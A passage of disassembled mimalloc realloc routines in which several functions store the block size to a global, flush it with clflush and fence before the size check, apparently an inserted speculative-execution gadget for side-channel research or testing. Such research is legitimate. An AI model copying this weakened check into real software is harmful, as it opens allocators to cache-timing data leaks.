  402917:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40291e:	00 00 
  402920:	48 83 fd 08          	cmp    $0x8,%rbp
  402924:	bf 08 00 00 00       	mov    $0x8,%edi
  402929:	48 89 da             	mov    %rbx,%rdx
  40292c:	48 0f 43 fd          	cmovae %rbp,%rdi
  402930:	31 f6                	xor    %esi,%esi
  402932:	48 83 ef 08          	sub    $0x8,%rdi
  402936:	48 29 fa             	sub    %rdi,%rdx
  402939:	4c 01 ef             	add    %r13,%rdi
  40293c:	e8 1f e5 ff ff       	callq  400e60 <memset@plt>
  402941:	eb 9e                	jmp    4028e1 <_mi_heap_realloc_zero+0xc1>
  402943:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402948:	31 c9                	xor    %ecx,%ecx
  40294a:	31 d2                	xor    %edx,%edx
  40294c:	48 89 de             	mov    %rbx,%rsi
  40294f:	4c 89 c7             	mov    %r8,%rdi
  402952:	e8 19 c8 00 00       	callq  40f170 <_mi_malloc_generic>
  402957:	49 89 c5             	mov    %rax,%r13
  40295a:	48 85 c0             	test   %rax,%rax
  40295d:	74 a4                	je     402903 <_mi_heap_realloc_zero+0xe3>
  40295f:	e9 6e ff ff ff       	jmpq   4028d2 <_mi_heap_realloc_zero+0xb2>
  402964:	0f 1f 40 00          	nopl   0x0(%rax)
  402968:	48 d1 e8             	shr    %rax
  40296b:	48 39 d8             	cmp    %rbx,%rax
  40296e:	0f 87 27 ff ff ff    	ja     40289b <_mi_heap_realloc_zero+0x7b>
  402974:	48 85 db             	test   %rbx,%rbx
  402977:	0f 84 1e ff ff ff    	je     40289b <_mi_heap_realloc_zero+0x7b>
  40297d:	4d 89 e5             	mov    %r12,%r13
  402980:	e9 7e ff ff ff       	jmpq   402903 <_mi_heap_realloc_zero+0xe3>
  402985:	0f 1f 00             	nopl   (%rax)
  402988:	e8 63 f1 ff ff       	callq  401af0 <mi_page_usable_aligned_size_of>
  40298d:	48 89 c5             	mov    %rax,%rbp
  402990:	e9 e2 fe ff ff       	jmpq   402877 <_mi_heap_realloc_zero+0x57>
  402995:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  40299c:	00 00 00 00 

00000000004029a0 <mi_heap_realloc>:
  4029a0:	41 55                	push   %r13
  4029a2:	49 89 f8             	mov    %rdi,%r8
  4029a5:	48 8d 7e ff          	lea    -0x1(%rsi),%rdi
  4029a9:	45 31 ed             	xor    %r13d,%r13d
  4029ac:	41 54                	push   %r12
  4029ae:	55                   	push   %rbp
  4029af:	48 89 f5             	mov    %rsi,%rbp
  4029b2:	53                   	push   %rbx
  4029b3:	48 89 d3             	mov    %rdx,%rbx
  4029b6:	48 83 ec 08          	sub    $0x8,%rsp
  4029ba:	48 81 e7 00 00 00 fe 	and    $0xfffffffffe000000,%rdi
  4029c1:	7e 34                	jle    4029f7 <mi_heap_realloc+0x57>
  4029c3:	48 89 f0             	mov    %rsi,%rax
  4029c6:	48 29 f8             	sub    %rdi,%rax
  4029c9:	48 c1 e8 10          	shr    $0x10,%rax
  4029cd:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  4029d1:	48 c1 e0 05          	shl    $0x5,%rax
  4029d5:	48 8d 90 20 01 00 00 	lea    0x120(%rax),%rdx
  4029dc:	8b 84 07 24 01 00 00 	mov    0x124(%rdi,%rax,1),%eax
  4029e3:	48 29 c2             	sub    %rax,%rdx
  4029e6:	48 01 d7             	add    %rdx,%rdi
  4029e9:	f6 47 0e 02          	testb  $0x2,0xe(%rdi)
  4029ed:	0f 85 dd 00 00 00    	jne    402ad0 <mi_heap_realloc+0x130>
  4029f3:	4c 8b 6f 28          	mov    0x28(%rdi),%r13
  4029f7:	4c 89 2d 8a 5d 22 00 	mov    %r13,0x225d8a(%rip)        # 628788 <size_realloc>
  4029fe:	0f ae 3d 83 5d 22 00 	clflush 0x225d83(%rip)        # 628788 <size_realloc>
  402a05:	0f ae f0             	mfence 
  402a08:	0f ae e8             	lfence 
  402a0b:	48 8b 05 76 5d 22 00 	mov    0x225d76(%rip),%rax        # 628788 <size_realloc>
  402a12:	48 39 c3             	cmp    %rax,%rbx
  402a15:	76 79                	jbe    402a90 <mi_heap_realloc+0xf0>
  402a17:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
  402a1e:	0f 87 8c 00 00 00    	ja     402ab0 <mi_heap_realloc+0x110>
  402a24:	48 8d 43 07          	lea    0x7(%rbx),%rax
  402a28:	48 c1 e8 03          	shr    $0x3,%rax
  402a2c:	49 8b 84 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rax
  402a33:	00 
  402a34:	4c 8b 60 10          	mov    0x10(%rax),%r12
  402a38:	4d 85 e4             	test   %r12,%r12
  402a3b:	0f 84 9f 00 00 00    	je     402ae0 <mi_heap_realloc+0x140>
  402a41:	49 8b 14 24          	mov    (%r12),%rdx
  402a45:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  402a4a:	48 89 50 10          	mov    %rdx,0x10(%rax)
  402a4e:	48 85 db             	test   %rbx,%rbx
  402a51:	75 05                	jne    402a58 <mi_heap_realloc+0xb8>
  402a53:	41 c6 04 24 00       	movb   $0x0,(%r12)
  402a58:	48 85 ed             	test   %rbp,%rbp
  402a5b:	74 1d                	je     402a7a <mi_heap_realloc+0xda>
  402a5d:	4c 39 eb             	cmp    %r13,%rbx
  402a60:	4c 89 ea             	mov    %r13,%rdx
  402a63:	4c 89 e7             	mov    %r12,%rdi
  402a66:	48 89 ee             	mov    %rbp,%rsi
  402a69:	48 0f 46 d3          	cmovbe %rbx,%rdx
  402a6d:	e8 2e e4 ff ff       	callq  400ea0 <memcpy@plt>
  402a72:	48 89 ef             	mov    %rbp,%rdi
  402a75:	e8 e6 f1 ff ff       	callq  401c60 <mi_free>
  402a7a:	48 83 c4 08          	add    $0x8,%rsp
  402a7e:	4c 89 e0             	mov    %r12,%rax
  402a81:	5b                   	pop    %rbx
  402a82:	5d                   	pop    %rbp
  402a83:	41 5c                	pop    %r12
  402a85:	41 5d                	pop    %r13
  402a87:	c3                   	retq   
  402a88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402a8f:	00 
  402a90:	48 d1 e8             	shr    %rax
  402a93:	48 39 c3             	cmp    %rax,%rbx
  402a96:	0f 82 7b ff ff ff    	jb     402a17 <mi_heap_realloc+0x77>
  402a9c:	48 85 db             	test   %rbx,%rbx
  402a9f:	0f 84 72 ff ff ff    	je     402a17 <mi_heap_realloc+0x77>
  402aa5:	49 89 ec             	mov    %rbp,%r12
  402aa8:	eb d0                	jmp    402a7a <mi_heap_realloc+0xda>
  402aaa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402ab0:	31 c9                	xor    %ecx,%ecx
  402ab2:	31 d2                	xor    %edx,%edx
  402ab4:	48 89 de             	mov    %rbx,%rsi
  402ab7:	4c 89 c7             	mov    %r8,%rdi
  402aba:	e8 b1 c6 00 00       	callq  40f170 <_mi_malloc_generic>
  402abf:	49 89 c4             	mov    %rax,%r12
  402ac2:	48 85 c0             	test   %rax,%rax
  402ac5:	75 91                	jne    402a58 <mi_heap_realloc+0xb8>
  402ac7:	45 31 e4             	xor    %r12d,%r12d
  402aca:	eb ae                	jmp    402a7a <mi_heap_realloc+0xda>
  402acc:	0f 1f 40 00          	nopl   0x0(%rax)
  402ad0:	e8 1b f0 ff ff       	callq  401af0 <mi_page_usable_aligned_size_of>
  402ad5:	49 89 c5             	mov    %rax,%r13
  402ad8:	e9 1a ff ff ff       	jmpq   4029f7 <mi_heap_realloc+0x57>
  402add:	0f 1f 00             	nopl   (%rax)
  402ae0:	31 c9                	xor    %ecx,%ecx
  402ae2:	31 d2                	xor    %edx,%edx
  402ae4:	48 89 de             	mov    %rbx,%rsi
  402ae7:	4c 89 c7             	mov    %r8,%rdi
  402aea:	e8 81 c6 00 00       	callq  40f170 <_mi_malloc_generic>
  402aef:	49 89 c4             	mov    %rax,%r12
  402af2:	48 85 c0             	test   %rax,%rax
  402af5:	74 d0                	je     402ac7 <mi_heap_realloc+0x127>
  402af7:	e9 52 ff ff ff       	jmpq   402a4e <mi_heap_realloc+0xae>
  402afc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000402b00 <mi_heap_reallocn>:
  402b00:	49 89 c8             	mov    %rcx,%r8
  402b03:	48 83 fa 01          	cmp    $0x1,%rdx
  402b07:	74 0b                	je     402b14 <mi_heap_reallocn+0x14>
  402b09:	48 89 d0             	mov    %rdx,%rax
  402b0c:	48 f7 e1             	mul    %rcx
  402b0f:	49 89 c0             	mov    %rax,%r8
  402b12:	70 0c                	jo     402b20 <mi_heap_reallocn+0x20>
  402b14:	31 c9                	xor    %ecx,%ecx
  402b16:	4c 89 c2             	mov    %r8,%rdx
  402b19:	e9 02 fd ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  402b1e:	66 90                	xchg   %ax,%ax
  402b20:	31 c0                	xor    %eax,%eax
  402b22:	c3                   	retq   
  402b23:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  402b2a:	00 00 00 00 
  402b2e:	66 90                	xchg   %ax,%ax

0000000000402b30 <mi_heap_reallocf>:
  402b30:	53                   	push   %rbx
  402b31:	31 c9                	xor    %ecx,%ecx
  402b33:	48 89 f3             	mov    %rsi,%rbx
  402b36:	48 83 ec 10          	sub    $0x10,%rsp
  402b3a:	e8 e1 fc ff ff       	callq  402820 <_mi_heap_realloc_zero>
  402b3f:	48 85 c0             	test   %rax,%rax
  402b42:	75 05                	jne    402b49 <mi_heap_reallocf+0x19>
  402b44:	48 85 db             	test   %rbx,%rbx
  402b47:	75 07                	jne    402b50 <mi_heap_reallocf+0x20>
  402b49:	48 83 c4 10          	add    $0x10,%rsp
  402b4d:	5b                   	pop    %rbx
  402b4e:	c3                   	retq   
  402b4f:	90                   	nop
  402b50:	48 89 df             	mov    %rbx,%rdi
  402b53:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  402b58:	e8 03 f1 ff ff       	callq  401c60 <mi_free>
  402b5d:	48 8b 44 24 08       	mov    0x8(%rsp),%rax
  402b62:	48 83 c4 10          	add    $0x10,%rsp
  402b66:	5b                   	pop    %rbx
  402b67:	c3                   	retq   
  402b68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402b6f:	00 

0000000000402b70 <mi_heap_rezalloc>:
  402b70:	41 55                	push   %r13
  402b72:	49 89 f8             	mov    %rdi,%r8
  402b75:	48 8d 7e ff          	lea    -0x1(%rsi),%rdi
  402b79:	41 54                	push   %r12
  402b7b:	49 89 f4             	mov    %rsi,%r12
  402b7e:	55                   	push   %rbp
  402b7f:	31 ed                	xor    %ebp,%ebp
  402b81:	53                   	push   %rbx
  402b82:	48 89 d3             	mov    %rdx,%rbx
  402b85:	48 83 ec 08          	sub    $0x8,%rsp
  402b89:	48 81 e7 00 00 00 fe 	and    $0xfffffffffe000000,%rdi
  402b90:	7e 34                	jle    402bc6 <mi_heap_rezalloc+0x56>
  402b92:	48 89 f0             	mov    %rsi,%rax
  402b95:	48 29 f8             	sub    %rdi,%rax
  402b98:	48 c1 e8 10          	shr    $0x10,%rax
  402b9c:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  402ba0:	48 c1 e0 05          	shl    $0x5,%rax
  402ba4:	48 8d 90 20 01 00 00 	lea    0x120(%rax),%rdx
  402bab:	8b 84 07 24 01 00 00 	mov    0x124(%rdi,%rax,1),%eax
  402bb2:	48 29 c2             	sub    %rax,%rdx
  402bb5:	48 01 d7             	add    %rdx,%rdi
  402bb8:	f6 47 0e 02          	testb  $0x2,0xe(%rdi)
  402bbc:	0f 85 16 01 00 00    	jne    402cd8 <mi_heap_rezalloc+0x168>
  402bc2:	48 8b 6f 28          	mov    0x28(%rdi),%rbp
  402bc6:	48 89 2d bb 5b 22 00 	mov    %rbp,0x225bbb(%rip)        # 628788 <size_realloc>
  402bcd:	0f ae 3d b4 5b 22 00 	clflush 0x225bb4(%rip)        # 628788 <size_realloc>
  402bd4:	0f ae f0             	mfence 
  402bd7:	0f ae e8             	lfence 
  402bda:	48 8b 05 a7 5b 22 00 	mov    0x225ba7(%rip),%rax        # 628788 <size_realloc>
  402be1:	48 39 c3             	cmp    %rax,%rbx
  402be4:	0f 86 ce 00 00 00    	jbe    402cb8 <mi_heap_rezalloc+0x148>
  402bea:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
  402bf1:	0f 87 a1 00 00 00    	ja     402c98 <mi_heap_rezalloc+0x128>
  402bf7:	48 8d 43 07          	lea    0x7(%rbx),%rax
  402bfb:	48 c1 e8 03          	shr    $0x3,%rax
  402bff:	49 8b 84 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rax
  402c06:	00 
  402c07:	4c 8b 68 10          	mov    0x10(%rax),%r13
  402c0b:	4d 85 ed             	test   %r13,%r13
  402c0e:	0f 84 84 00 00 00    	je     402c98 <mi_heap_rezalloc+0x128>
  402c14:	49 8b 55 00          	mov    0x0(%r13),%rdx
  402c18:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  402c1d:	48 89 50 10          	mov    %rdx,0x10(%rax)
  402c21:	48 39 eb             	cmp    %rbp,%rbx
  402c24:	77 4a                	ja     402c70 <mi_heap_rezalloc+0x100>
  402c26:	48 85 db             	test   %rbx,%rbx
  402c29:	74 35                	je     402c60 <mi_heap_rezalloc+0xf0>
  402c2b:	4d 85 e4             	test   %r12,%r12
  402c2e:	74 1d                	je     402c4d <mi_heap_rezalloc+0xdd>
  402c30:	48 39 eb             	cmp    %rbp,%rbx
  402c33:	48 89 ea             	mov    %rbp,%rdx
  402c36:	4c 89 ef             	mov    %r13,%rdi
  402c39:	4c 89 e6             	mov    %r12,%rsi
  402c3c:	48 0f 46 d3          	cmovbe %rbx,%rdx
  402c40:	e8 5b e2 ff ff       	callq  400ea0 <memcpy@plt>
  402c45:	4c 89 e7             	mov    %r12,%rdi
  402c48:	e8 13 f0 ff ff       	callq  401c60 <mi_free>
  402c4d:	48 83 c4 08          	add    $0x8,%rsp
  402c51:	4c 89 e8             	mov    %r13,%rax
  402c54:	5b                   	pop    %rbx
  402c55:	5d                   	pop    %rbp
  402c56:	41 5c                	pop    %r12
  402c58:	41 5d                	pop    %r13
  402c5a:	c3                   	retq   
  402c5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402c60:	41 c6 45 00 00       	movb   $0x0,0x0(%r13)
  402c65:	eb c4                	jmp    402c2b <mi_heap_rezalloc+0xbb>
  402c67:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  402c6e:	00 00 
  402c70:	48 83 fd 08          	cmp    $0x8,%rbp
  402c74:	bf 08 00 00 00       	mov    $0x8,%edi
  402c79:	48 89 da             	mov    %rbx,%rdx
  402c7c:	48 0f 43 fd          	cmovae %rbp,%rdi
  402c80:	31 f6                	xor    %esi,%esi
  402c82:	48 83 ef 08          	sub    $0x8,%rdi
  402c86:	48 29 fa             	sub    %rdi,%rdx
  402c89:	4c 01 ef             	add    %r13,%rdi
  402c8c:	e8 cf e1 ff ff       	callq  400e60 <memset@plt>
  402c91:	eb 98                	jmp    402c2b <mi_heap_rezalloc+0xbb>
  402c93:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402c98:	31 c9                	xor    %ecx,%ecx
  402c9a:	31 d2                	xor    %edx,%edx
  402c9c:	48 89 de             	mov    %rbx,%rsi
  402c9f:	4c 89 c7             	mov    %r8,%rdi
  402ca2:	e8 c9 c4 00 00       	callq  40f170 <_mi_malloc_generic>
  402ca7:	49 89 c5             	mov    %rax,%r13
  402caa:	48 85 c0             	test   %rax,%rax
  402cad:	74 9e                	je     402c4d <mi_heap_rezalloc+0xdd>
  402caf:	e9 6d ff ff ff       	jmpq   402c21 <mi_heap_rezalloc+0xb1>
  402cb4:	0f 1f 40 00          	nopl   0x0(%rax)
  402cb8:	48 d1 e8             	shr    %rax
  402cbb:	48 39 c3             	cmp    %rax,%rbx
  402cbe:	0f 82 26 ff ff ff    	jb     402bea <mi_heap_rezalloc+0x7a>
  402cc4:	48 85 db             	test   %rbx,%rbx
  402cc7:	0f 84 1d ff ff ff    	je     402bea <mi_heap_rezalloc+0x7a>
  402ccd:	4d 89 e5             	mov    %r12,%r13
  402cd0:	e9 78 ff ff ff       	jmpq   402c4d <mi_heap_rezalloc+0xdd>
  402cd5:	0f 1f 00             	nopl   (%rax)
  402cd8:	e8 13 ee ff ff       	callq  401af0 <mi_page_usable_aligned_size_of>
  402cdd:	48 89 c5             	mov    %rax,%rbp
  402ce0:	e9 e1 fe ff ff       	jmpq   402bc6 <mi_heap_rezalloc+0x56>
  402ce5:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  402cec:	00 00 00 00 

0000000000402cf0 <mi_heap_recalloc>:
  402cf0:	49 89 c8             	mov    %rcx,%r8
  402cf3:	48 83 fa 01          	cmp    $0x1,%rdx
  402cf7:	74 0b                	je     402d04 <mi_heap_recalloc+0x14>
  402cf9:	48 89 d0             	mov    %rdx,%rax
  402cfc:	48 f7 e1             	mul    %rcx
  402cff:	49 89 c0             	mov    %rax,%r8
  402d02:	70 14                	jo     402d18 <mi_heap_recalloc+0x28>
  402d04:	b9 01 00 00 00       	mov    $0x1,%ecx
  402d09:	4c 89 c2             	mov    %r8,%rdx
  402d0c:	e9 0f fb ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  402d11:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402d18:	31 c0                	xor    %eax,%eax
  402d1a:	c3                   	retq   
  402d1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000402d20 <mi_realloc>:
  402d20:	41 55                	push   %r13
  402d22:	45 31 ed             	xor    %r13d,%r13d
  402d25:	41 54                	push   %r12
  402d27:	55                   	push   %rbp
  402d28:	48 89 fd             	mov    %rdi,%rbp
  402d2b:	48 83 ef 01          	sub    $0x1,%rdi
  402d2f:	53                   	push   %rbx
  402d30:	48 89 f3             	mov    %rsi,%rbx
  402d33:	48 83 ec 08          	sub    $0x8,%rsp
  402d37:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  402d3e:	64 4c 8b 00          	mov    %fs:(%rax),%r8
  402d42:	48 81 e7 00 00 00 fe 	and    $0xfffffffffe000000,%rdi
  402d49:	7e 34                	jle    402d7f <mi_realloc+0x5f>
  402d4b:	48 89 e8             	mov    %rbp,%rax
  402d4e:	48 29 f8             	sub    %rdi,%rax
  402d51:	48 c1 e8 10          	shr    $0x10,%rax
  402d55:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  402d59:	48 c1 e0 05          	shl    $0x5,%rax
  402d5d:	48 8d 90 20 01 00 00 	lea    0x120(%rax),%rdx
  402d64:	8b 84 07 24 01 00 00 	mov    0x124(%rdi,%rax,1),%eax
  402d6b:	48 29 c2             	sub    %rax,%rdx
  402d6e:	48 01 d7             	add    %rdx,%rdi
  402d71:	f6 47 0e 02          	testb  $0x2,0xe(%rdi)
  402d75:	0f 85 cd 00 00 00    	jne    402e48 <mi_realloc+0x128>
  402d7b:	4c 8b 6f 28          	mov    0x28(%rdi),%r13
  402d7f:	4c 89 2d 02 5a 22 00 	mov    %r13,0x225a02(%rip)        # 628788 <size_realloc>
  402d86:	0f ae 3d fb 59 22 00 	clflush 0x2259fb(%rip)        # 628788 <size_realloc>
  402d8d:	0f ae f0             	mfence 
  402d90:	0f ae e8             	lfence 
  402d93:	48 8b 05 ee 59 22 00 	mov    0x2259ee(%rip),%rax        # 628788 <size_realloc>
  402d9a:	48 39 c3             	cmp    %rax,%rbx
  402d9d:	76 71                	jbe    402e10 <mi_realloc+0xf0>
  402d9f:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
  402da6:	0f 87 7c 00 00 00    	ja     402e28 <mi_realloc+0x108>
  402dac:	48 8d 43 07          	lea    0x7(%rbx),%rax
  402db0:	48 c1 e8 03          	shr    $0x3,%rax
  402db4:	49 8b 84 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rax
  402dbb:	00 
  402dbc:	4c 8b 60 10          	mov    0x10(%rax),%r12
  402dc0:	4d 85 e4             	test   %r12,%r12
  402dc3:	0f 84 97 00 00 00    	je     402e60 <mi_realloc+0x140>
  402dc9:	49 8b 14 24          	mov    (%r12),%rdx
  402dcd:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  402dd2:	48 89 50 10          	mov    %rdx,0x10(%rax)
  402dd6:	48 85 db             	test   %rbx,%rbx
  402dd9:	75 05                	jne    402de0 <mi_realloc+0xc0>
  402ddb:	41 c6 04 24 00       	movb   $0x0,(%r12)
  402de0:	48 85 ed             	test   %rbp,%rbp
  402de3:	74 1d                	je     402e02 <mi_realloc+0xe2>
  402de5:	4c 39 eb             	cmp    %r13,%rbx
  402de8:	4c 89 ea             	mov    %r13,%rdx
  402deb:	4c 89 e7             	mov    %r12,%rdi
  402dee:	48 89 ee             	mov    %rbp,%rsi
  402df1:	48 0f 46 d3          	cmovbe %rbx,%rdx
  402df5:	e8 a6 e0 ff ff       	callq  400ea0 <memcpy@plt>
  402dfa:	48 89 ef             	mov    %rbp,%rdi
  402dfd:	e8 5e ee ff ff       	callq  401c60 <mi_free>
  402e02:	48 83 c4 08          	add    $0x8,%rsp
  402e06:	4c 89 e0             	mov    %r12,%rax
  402e09:	5b                   	pop    %rbx
  402e0a:	5d                   	pop    %rbp
  402e0b:	41 5c                	pop    %r12
  402e0d:	41 5d                	pop    %r13
  402e0f:	c3                   	retq   
  402e10:	48 d1 e8             	shr    %rax
  402e13:	48 39 c3             	cmp    %rax,%rbx
  402e16:	72 87                	jb     402d9f <mi_realloc+0x7f>
  402e18:	48 85 db             	test   %rbx,%rbx
  402e1b:	74 82                	je     402d9f <mi_realloc+0x7f>
  402e1d:	49 89 ec             	mov    %rbp,%r12
  402e20:	eb e0                	jmp    402e02 <mi_realloc+0xe2>
  402e22:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402e28:	31 c9                	xor    %ecx,%ecx
  402e2a:	31 d2                	xor    %edx,%edx
  402e2c:	48 89 de             	mov    %rbx,%rsi
  402e2f:	4c 89 c7             	mov    %r8,%rdi
  402e32:	e8 39 c3 00 00       	callq  40f170 <_mi_malloc_generic>
  402e37:	49 89 c4             	mov    %rax,%r12
  402e3a:	48 85 c0             	test   %rax,%rax
  402e3d:	75 a1                	jne    402de0 <mi_realloc+0xc0>
  402e3f:	45 31 e4             	xor    %r12d,%r12d
  402e42:	eb be                	jmp    402e02 <mi_realloc+0xe2>
  402e44:	0f 1f 40 00          	nopl   0x0(%rax)
  402e48:	48 89 ee             	mov    %rbp,%rsi
  402e4b:	e8 a0 ec ff ff       	callq  401af0 <mi_page_usable_aligned_size_of>
  402e50:	49 89 c5             	mov    %rax,%r13
  402e53:	e9 27 ff ff ff       	jmpq   402d7f <mi_realloc+0x5f>
  402e58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402e5f:	00 
  402e60:	31 c9                	xor    %ecx,%ecx
  402e62:	31 d2                	xor    %edx,%edx
  402e64:	48 89 de             	mov    %rbx,%rsi
  402e67:	4c 89 c7             	mov    %r8,%rdi
  402e6a:	e8 01 c3 00 00       	callq  40f170 <_mi_malloc_generic>
  402e6f:	49 89 c4             	mov    %rax,%r12
  402e72:	48 85 c0             	test   %rax,%rax
  402e75:	74 c8                	je     402e3f <mi_realloc+0x11f>
  402e77:	e9 5a ff ff ff       	jmpq   402dd6 <mi_realloc+0xb6>
  402e7c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000402e80 <mi_reallocn>:
  402e80:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  402e87:	49 89 f8             	mov    %rdi,%r8
  402e8a:	64 48 8b 38          	mov    %fs:(%rax),%rdi
  402e8e:	48 83 fe 01          	cmp    $0x1,%rsi
  402e92:	74 0b                	je     402e9f <mi_reallocn+0x1f>
  402e94:	48 89 f0             	mov    %rsi,%rax
  402e97:	48 f7 e2             	mul    %rdx
  402e9a:	48 89 c2             	mov    %rax,%rdx
  402e9d:	70 11                	jo     402eb0 <mi_reallocn+0x30>
  402e9f:	31 c9                	xor    %ecx,%ecx
  402ea1:	4c 89 c6             	mov    %r8,%rsi
  402ea4:	e9 77 f9 ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  402ea9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402eb0:	31 c0                	xor    %eax,%eax
  402eb2:	c3                   	retq   
  402eb3:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  402eba:	00 00 00 00 
  402ebe:	66 90                	xchg   %ax,%ax

0000000000402ec0 <mi_reallocf>:
  402ec0:	53                   	push   %rbx
  402ec1:	48 89 fb             	mov    %rdi,%rbx
  402ec4:	48 89 f2             	mov    %rsi,%rdx
  402ec7:	31 c9                	xor    %ecx,%ecx
  402ec9:	48 89 de             	mov    %rbx,%rsi
  402ecc:	48 83 ec 10          	sub    $0x10,%rsp
  402ed0:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  402ed7:	64 48 8b 38          	mov    %fs:(%rax),%rdi
  402edb:	e8 40 f9 ff ff       	callq  402820 <_mi_heap_realloc_zero>
  402ee0:	48 85 c0             	test   %rax,%rax
  402ee3:	75 05                	jne    402eea <mi_reallocf+0x2a>
  402ee5:	48 85 db             	test   %rbx,%rbx
  402ee8:	75 06                	jne    402ef0 <mi_reallocf+0x30>
  402eea:	48 83 c4 10          	add    $0x10,%rsp
  402eee:	5b                   	pop    %rbx
  402eef:	c3                   	retq   
  402ef0:	48 89 df             	mov    %rbx,%rdi
  402ef3:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  402ef8:	e8 63 ed ff ff       	callq  401c60 <mi_free>
  402efd:	48 8b 44 24 08       	mov    0x8(%rsp),%rax
  402f02:	48 83 c4 10          	add    $0x10,%rsp
  402f06:	5b                   	pop    %rbx
  402f07:	c3                   	retq   
  402f08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402f0f:	00 

0000000000402f10 <mi_rezalloc>:
  402f10:	41 55                	push   %r13
  402f12:	41 54                	push   %r12
  402f14:	49 89 fc             	mov    %rdi,%r12
  402f17:	48 83 ef 01          	sub    $0x1,%rdi
  402f1b:	55                   	push   %rbp
  402f1c:	31 ed                	xor    %ebp,%ebp
  402f1e:	53                   	push   %rbx
  402f1f:	48 89 f3             	mov    %rsi,%rbx
  402f22:	48 83 ec 08          	sub    $0x8,%rsp
  402f26:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  402f2d:	64 4c 8b 00          	mov    %fs:(%rax),%r8
  402f31:	48 81 e7 00 00 00 fe 	and    $0xfffffffffe000000,%rdi
  402f38:	7e 34                	jle    402f6e <mi_rezalloc+0x5e>
  402f3a:	4c 89 e0             	mov    %r12,%rax
  402f3d:	48 29 f8             	sub    %rdi,%rax
  402f40:	48 c1 e8 10          	shr    $0x10,%rax
  402f44:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  402f48:	48 c1 e0 05          	shl    $0x5,%rax
  402f4c:	48 8d 90 20 01 00 00 	lea    0x120(%rax),%rdx
  402f53:	8b 84 07 24 01 00 00 	mov    0x124(%rdi,%rax,1),%eax
  402f5a:	48 29 c2             	sub    %rax,%rdx
  402f5d:	48 01 d7             	add    %rdx,%rdi
  402f60:	f6 47 0e 02          	testb  $0x2,0xe(%rdi)
  402f64:	0f 85 0e 01 00 00    	jne    403078 <mi_rezalloc+0x168>
  402f6a:	48 8b 6f 28          	mov    0x28(%rdi),%rbp
  402f6e:	48 89 2d 13 58 22 00 	mov    %rbp,0x225813(%rip)        # 628788 <size_realloc>
  402f75:	0f ae 3d 0c 58 22 00 	clflush 0x22580c(%rip)        # 628788 <size_realloc>
  402f7c:	0f ae f0             	mfence 
  402f7f:	0f ae e8             	lfence 
  402f82:	48 8b 05 ff 57 22 00 	mov    0x2257ff(%rip),%rax        # 628788 <size_realloc>
  402f89:	48 39 c3             	cmp    %rax,%rbx
  402f8c:	0f 86 c6 00 00 00    	jbe    403058 <mi_rezalloc+0x148>
  402f92:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
  402f99:	0f 87 99 00 00 00    	ja     403038 <mi_rezalloc+0x128>
  402f9f:	48 8d 43 07          	lea    0x7(%rbx),%rax
  402fa3:	48 c1 e8 03          	shr    $0x3,%rax
  402fa7:	49 8b 84 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rax
  402fae:	00 
  402faf:	4c 8b 68 10          	mov    0x10(%rax),%r13
  402fb3:	4d 85 ed             	test   %r13,%r13
  402fb6:	0f 84 7c 00 00 00    	je     403038 <mi_rezalloc+0x128>
  402fbc:	49 8b 55 00          	mov    0x0(%r13),%rdx
  402fc0:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  402fc5:	48 89 50 10          	mov    %rdx,0x10(%rax)
  402fc9:	48 39 eb             	cmp    %rbp,%rbx
  402fcc:	77 42                	ja     403010 <mi_rezalloc+0x100>
  402fce:	48 85 db             	test   %rbx,%rbx
  402fd1:	74 35                	je     403008 <mi_rezalloc+0xf8>
  402fd3:	4d 85 e4             	test   %r12,%r12
  402fd6:	74 1d                	je     402ff5 <mi_rezalloc+0xe5>
  402fd8:	48 39 eb             	cmp    %rbp,%rbx
  402fdb:	48 89 ea             	mov    %rbp,%rdx
  402fde:	4c 89 ef             	mov    %r13,%rdi
